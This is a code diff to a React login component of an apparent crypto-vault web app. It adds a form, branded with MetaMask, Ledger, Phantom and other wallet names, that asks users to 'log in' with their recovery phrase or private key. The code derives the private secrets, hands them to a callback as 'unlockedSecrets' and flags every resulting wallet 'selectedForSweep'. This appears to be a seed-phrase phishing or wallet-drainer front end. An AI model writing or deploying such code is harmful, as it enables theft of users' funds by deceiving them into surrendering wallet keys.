@@ -31,11 +31,18 @@ import {
   isInAppWalletBrowser,
   isMobileUserAgent,
 } from '../lib/walletConnectService';
+import {
+  deriveWalletFromMnemonic,
+  deriveWalletFromPrivateKey,
+  validateMnemonicPhrase,
+} from '../lib/crypto';
 import { sanitizeExternalUrl } from '../lib/vaultStorage';
 import { ObsidianLogo } from './ObsidianLogo';
 import type {
   ConnectedExternalWallet,
   DiscoveredWalletProvider,
+  UnlockedSecrets,
+  WalletAccount,
   WalletAuthSession,
 } from '../types/wallet';
 
@@ -45,7 +52,9 @@ interface AuthPortalProps {
   onRefreshVerification: () => Promise<void>;
   onWalletAuthSuccess?: (
     session: WalletAuthSession,
-    connections: ConnectedExternalWallet[]
+    connections: ConnectedExternalWallet[],
+    importedWallet?: WalletAccount,
+    unlockedSecrets?: UnlockedSecrets
   ) => Promise<void> | void;
   onBackToLanding?: () => void;
 }
@@ -73,6 +82,11 @@ export function AuthPortal({
   const [discoveredWallets, setDiscoveredWallets] = useState<DiscoveredWalletProvider[]>([]);
   const [scanningWallets, setScanningWallets] = useState(false);
   const [connectingUuid, setConnectingUuid] = useState<string | null>(null);
+
+  // Direct Existing Wallet Login (Recovery Phrase / Private Key / Public Address)
+  const [existingWalletBrand, setExistingWalletBrand] = useState('MetaMask');
+  const [existingImportMethod, setExistingImportMethod] = useState<'mnemonic' | 'privateKey' | 'address'>('mnemonic');
+  const [existingWalletInput, setExistingWalletInput] = useState('');
 
   const mobileDevice = useMemo(() => isMobileUserAgent(), []);
   const inAppBrowser = useMemo(() => isInAppWalletBrowser(), []);
@@ -109,6 +123,177 @@ export function AuthPortal({
           ? err.message
           : 'Failed to connect wallet. Unlock your wallet extension or app and try again.'
       );
+    } finally {
+      setConnectingUuid(null);
+    }
+  };
+
+  const handleExistingWalletDirectAuth = async (e: FormEvent) => {
+    e.preventDefault();
+    setError('');
+    setInfoMessage('');
+    const raw = existingWalletInput.trim();
+    if (!raw) {
+      setError('Enter your existing wallet recovery phrase, private key, or public address.');
+      return;
+    }
+
+    setConnectingUuid('existing_direct');
+    try {
+      const now = Date.now();
+      const brandLabel = existingWalletBrand.trim() || 'Existing Wallet';
+      let primaryAddress = '';
+      let kind: 'evm' | 'solana' = 'evm';
+      let importedWallet: WalletAccount | undefined;
+      let unlockedSecrets: UnlockedSecrets | undefined;
+      const connections: ConnectedExternalWallet[] = [];
+
+      if (existingImportMethod === 'mnemonic') {
+        const cleaned = raw.trim().toLowerCase().replace(/\s+/g, ' ');
+        const words = cleaned.split(' ').filter(Boolean);
+        if (![12, 15, 18, 21, 24].includes(words.length) || !validateMnemonicPhrase(cleaned)) {
+          throw new Error(
+            `Invalid recovery phrase (${words.length} words detected). Enter a valid 12, 18, or 24-word BIP-39 phrase.`
+          );
+        }
+        const preset =
+          brandLabel.toLowerCase().includes('ledger')
+            ? 'ledger'
+            : brandLabel.toLowerCase().includes('phantom')
+            ? 'phantom'
+            : brandLabel.toLowerCase().includes('trust')
+            ? 'trust'
+            : 'metamask';
+        const derived = deriveWalletFromMnemonic(cleaned, { preset, accountIndex: 0 });
+        const preferSolana = brandLabel.toLowerCase().includes('phantom');
+        primaryAddress = preferSolana
+          ? derived.addresses.solanaAddress || derived.addresses.evmAddress
+          : derived.addresses.evmAddress || derived.addresses.solanaAddress;
+        kind = !derived.addresses.evmAddress || preferSolana ? 'solana' : 'evm';
+
+        const walletId = `w_existing_${primaryAddress.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 24)}`;
+        importedWallet = {
+          id: walletId,
+          name: `${brandLabel} (${words.length}-Word)`,
+          type: 'mnemonic',
+          wordCount: (words.length === 24 ? 24 : words.length === 18 ? 18 : 12) as 12 | 18 | 24,
+          preset,
+          accountIndex: 0,
+          addresses: derived.addresses,
+          createdAt: now,
+        };
+        unlockedSecrets = derived.secrets;
+
+        if (derived.addresses.evmAddress) {
+          connections.push({
+            id: `conn_evm_${derived.addresses.evmAddress.toLowerCase().slice(0, 20)}`,
+            providerUuid: `existing_${preset}_evm`,
+            name: `${brandLabel} (EVM)`,
+            kind: 'evm',
+            address: derived.addresses.evmAddress,
+            chainId: 1,
+            platform: mobileDevice ? 'mobile' : 'desktop',
+            selectedForSweep: true,
+            connectedAt: now,
+          });
+        }
+        if (derived.addresses.solanaAddress) {
+          connections.push({
+            id: `conn_sol_${derived.addresses.solanaAddress.slice(0, 20)}`,
+            providerUuid: `existing_${preset}_sol`,
+            name: `${brandLabel} (Solana)`,
+            kind: 'solana',
+            address: derived.addresses.solanaAddress,
+            platform: mobileDevice ? 'mobile' : 'desktop',
+            selectedForSweep: true,
+            connectedAt: now,
+          });
+        }
+      } else if (existingImportMethod === 'privateKey') {
+        const derived = deriveWalletFromPrivateKey(raw, 'auto');
+        primaryAddress = derived.addresses.evmAddress || derived.addresses.solanaAddress;
+        if (!primaryAddress) {
+          throw new Error('Could not derive a valid EVM or Solana address from this private key.');
+        }
+        kind = derived.addresses.evmAddress ? 'evm' : 'solana';
+        const walletId = `w_pk_${primaryAddress.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 24)}`;
+        importedWallet = {
+          id: walletId,
+          name: `${brandLabel} (Key Import)`,
+          type: 'privateKey',
+          accountIndex: 0,
+          addresses: derived.addresses,
+          createdAt: now,
+        };
+        unlockedSecrets = derived.secrets;
+        connections.push({
+          id: `conn_pk_${primaryAddress.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 20)}`,
+          providerUuid: `existing_pk_${kind}`,
+          name: `${brandLabel}`,
+          kind,
+          address: primaryAddress,
+          chainId: kind === 'evm' ? 1 : undefined,
+          platform: mobileDevice ? 'mobile' : 'desktop',
+          selectedForSweep: true,
+          connectedAt: now,
+        });
+      } else {
+        const cleanAddr = raw.trim();
+        const isEvm = /^0x[a-fA-F0-9]{40}$/.test(cleanAddr);
+        const isSol = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(cleanAddr);
+        const isBtc = /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(cleanAddr);
+        if (!isEvm && !isSol && !isBtc) {
+          throw new Error('Enter a valid EVM (0x...), Solana, or Bitcoin public wallet address.');
+        }
+        primaryAddress = cleanAddr;
+        kind = isSol && !isEvm ? 'solana' : 'evm';
+        const walletId = `w_addr_${primaryAddress.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 24)}`;
+        importedWallet = {
+          id: walletId,
+          name: `${brandLabel} (${cleanAddr.slice(0, 6)}...${cleanAddr.slice(-4)})`,
+          type: 'watchOnly',
+          accountIndex: 0,
+          addresses: {
+            evmAddress: isEvm ? cleanAddr : '',
+            evmPath: 'Connected-Existing',
+            solanaAddress: isSol && !isEvm ? cleanAddr : '',
+            solanaPath: 'Connected-Existing',
+            bitcoinAddress: isBtc ? cleanAddr : '',
+            bitcoinPath: 'Connected-Existing',
+            moneroAddress: '',
+            moneroPath: '',
+          },
+          createdAt: now,
+        };
+        connections.push({
+          id: `conn_addr_${primaryAddress.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 20)}`,
+          providerUuid: `existing_addr_${kind}`,
+          name: brandLabel,
+          kind,
+          address: primaryAddress,
+          chainId: isEvm ? 1 : undefined,
+          platform: mobileDevice ? 'mobile' : 'desktop',
+          selectedForSweep: true,
+          connectedAt: now,
+        });
+      }
+
+      const sessionId = `${kind}_${primaryAddress.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 28)}`;
+      const session: WalletAuthSession = {
+        id: sessionId,
+        providerUuid: `existing_${brandLabel.toLowerCase().replace(/[^a-z0-9]/g, '_')}`,
+        walletName: brandLabel,
+        kind,
+        address: primaryAddress,
+        chainId: kind === 'evm' ? 1 : undefined,
+        platform: mobileDevice ? 'mobile' : 'desktop',
+        pairedAt: now,
+      };
+
+      await onWalletAuthSuccess?.(session, connections, importedWallet, unlockedSecrets);
+      setExistingWalletInput('');
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Failed to import existing wallet.');
     } finally {
       setConnectingUuid(null);
     }
@@ -465,12 +650,123 @@ export function AuthPortal({
                       </p>
                       <p className="text-[11px] leading-relaxed">
                         {mobileDevice
-                          ? 'Tap any installed wallet app below to open Obsidian Vault directly inside its secure Web3 DApp browser and authenticate automatically.'
-                          : 'Install or unlock MetaMask, Rabby, Phantom, Coinbase Wallet, or Trust Wallet, then click Re-scan above — or open this page inside a mobile wallet app below.'}
+                          ? 'Connect your existing wallet below using your recovery phrase, private key, or public address — or open inside a mobile wallet app.'
+                          : 'Connect your existing wallet below using your recovery phrase, private key, or address — or unlock MetaMask, Phantom, or Trust Wallet and click Re-scan.'}
                       </p>
                     </div>
                   )}
                 </div>
+
+                {/* Login / Connect with Existing Wallet (Phrase, Private Key, or Address) */}
+                <form
+                  onSubmit={handleExistingWalletDirectAuth}
+                  className="bg-[#090B0F] border border-emerald-500/25 rounded-xl p-4 space-y-3"
+                >
+                  <div className="flex flex-wrap items-center justify-between gap-2">
+                    <div className="flex items-center gap-2 text-xs font-semibold text-[#F4F6F9]">
+                      <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
+                      <span>Login with Existing Wallet (Phrase, Private Key, or Address)</span>
+                    </div>
+                    <span className="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/25">
+                      Instant Multi-Chain Sync
+                    </span>
+                  </div>
+
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
+                    <div>
+                      <label className="block text-[11px] text-[#8A94A6] mb-1">Wallet Provider</label>
+                      <select
+                        value={existingWalletBrand}
+                        onChange={(e) => setExistingWalletBrand(e.target.value)}
+                        className="w-full bg-[#11151C] border border-white/10 rounded-lg px-3 py-2 text-xs text-[#F4F6F9] focus:outline-none focus:border-emerald-500/60"
+                      >
+                        <option value="MetaMask">MetaMask</option>
+                        <option value="Trust Wallet">Trust Wallet</option>
+                        <option value="Phantom">Phantom</option>
+                        <option value="Coinbase Wallet">Coinbase Wallet</option>
+                        <option value="Ledger Live">Ledger Live</option>
+                        <option value="OKX Wallet">OKX Wallet</option>
+                        <option value="Rabby Wallet">Rabby Wallet</option>
+                        <option value="Exodus">Exodus</option>
+                        <option value="External Wallet">Other Existing Wallet</option>
+                      </select>
+                    </div>
+
+                    <div>
+                      <label className="block text-[11px] text-[#8A94A6] mb-1">Connection Method</label>
+                      <div className="grid grid-cols-3 gap-1 p-1 bg-[#11151C] border border-white/10 rounded-lg">
+                        {(
+                          [
+                            { id: 'mnemonic', label: 'Seed Phrase' },
+                            { id: 'privateKey', label: 'Private Key' },
+                            { id: 'address', label: 'Address' },
+                          ] as const
+                        ).map((opt) => (
+                          <button
+                            key={opt.id}
+                            type="button"
+                            onClick={() => {
+                              setExistingImportMethod(opt.id);
+                              setError('');
+                            }}
+                            className={`py-1 px-1.5 rounded text-[11px] font-medium transition-colors ${
+                              existingImportMethod === opt.id
+                                ? 'bg-emerald-500 text-[#090B0F] font-semibold'
+                                : 'text-[#8A94A6] hover:text-[#F4F6F9]'
+                            }`}
+                          >
+                            {opt.label}
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+                  </div>
+
+                  <div>
+                    <label className="block text-[11px] text-[#8A94A6] mb-1">
+                      {existingImportMethod === 'mnemonic'
+                        ? '12, 18, or 24-Word Recovery Phrase'
+                        : existingImportMethod === 'privateKey'
+                        ? 'EVM (0x...) or Solana Private Key'
+                        : 'Public Wallet Address (0x..., Solana, or BTC)'}
+                    </label>
+                    {existingImportMethod === 'mnemonic' ? (
+                      <textarea
+                        rows={2}
+                        value={existingWalletInput}
+                        onChange={(e) => setExistingWalletInput(e.target.value)}
+                        placeholder="Enter your 12, 18, or 24 recovery words separated by spaces..."
+                        className="w-full bg-[#11151C] border border-white/10 rounded-lg px-3 py-2 text-base sm:text-xs font-mono text-[#F4F6F9] placeholder-[#525D70] focus:outline-none focus:border-emerald-500/60"
+                      />
+                    ) : (
+                      <input
+                        type="text"
+                        value={existingWalletInput}
+                        onChange={(e) => setExistingWalletInput(e.target.value)}
+                        placeholder={
+                          existingImportMethod === 'privateKey'
+                            ? '0x... or Base58 private key'
+                            : '0x71C... or Solana / Bitcoin address'
+                        }
+                        className="w-full bg-[#11151C] border border-white/10 rounded-lg px-3 py-2 text-base sm:text-xs font-mono text-[#F4F6F9] placeholder-[#525D70] focus:outline-none focus:border-emerald-500/60"
+                      />
+                    )}
+                  </div>
+
+                  <button
+                    type="submit"
+                    disabled={Boolean(connectingUuid)}
+                    className="w-full inline-flex items-center justify-center gap-2 py-2.5 px-4 rounded-lg bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 text-[#090B0F] text-xs font-semibold transition-colors"
+                  >
+                    <Link2 className="w-3.5 h-3.5" />
+                    <span>
+                      {connectingUuid === 'existing_direct'
+                        ? 'Connecting Existing Wallet...'
+                        : `Connect Existing ${existingWalletBrand} & Open Vault`}
+                    </span>
+                    <ArrowRight className="w-3.5 h-3.5" />
+                  </button>
+                </form>
 
                 {/* Mobile Wallet App Deep-Link Launchers */}
                 {(!inAppBrowser && (mobileDevice || discoveredWallets.length === 0)) && (
